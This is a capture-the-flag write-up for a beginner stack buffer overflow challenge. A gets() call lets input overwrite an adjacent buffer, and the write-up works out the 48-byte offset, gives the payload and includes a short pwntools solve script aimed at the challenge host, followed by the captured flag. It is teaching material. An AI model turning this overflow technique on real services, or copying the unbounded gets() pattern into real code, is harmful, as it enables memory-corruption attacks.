solution notes

Walkthrough

Binary Exploitation (Beginner)

Description

We were given the source code and a remote service.

The program allows users to:

Read two strings.

Modify one of them.

Relevant code:

char non_constant[BUFFSIZE] = "I love";

const char constant[BUFFSIZE] = "barackCTF";

The goal is to make:

strcmp(c, "boroCTF") == 0

evaluate to true.

Vulnerability

The function responsible for editing the string is:

void change(char *nc) {

printf("What would like to write?\n> ");

gets(nc);

}

gets() performs no bounds checking, making it vulnerable to a classic stack buffer overflow.

Understanding the Stack Layout

The binary was protected with:

Full RELRO

Canary

NX

PIE

However, we do not need code execution.

Disassembling main() showed:

non_constant -> rbp-0x90

constant -> rbp-0x60

Distance:

0x90 - 0x60 = 0x30 = 48 bytes

Therefore, writing more than 48 bytes into non_constant will overwrite constant.

Exploit

Send:

"A" * 48 + "boroCTF"

This changes:

barackCTF

into:

boroCTF

When option 1 is selected:

check(non_constant, constant);

the comparison succeeds:

strcmp(c, "boroCTF") == 0

and the flag is printed.

Solve Script

from pwn import *
io = remote("1xgu8bd1niap.boroctf.com", 34069)
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"A"*48 + b"boroCTF")
io.sendlineafter(b"> ", b"1")
io.interactive()

boroCTF{I_c@n_7ix_tH%s}

Takeaway

Even with modern protections such as PIE, NX, Canary, and Full RELRO, logic flaws and unsafe functions like gets() can still allow attackers to manipulate program state and achieve the challenge goal without needing full code execution.

Clue 02

Clue 03

after action report

Lessons Learned

  • Modern mitigations do not stop all state corruption bugs.
  • A stack overflow can solve logic goals without ROP or shellcode.
  • Understanding variable layout is often enough for beginner pwn challenges.
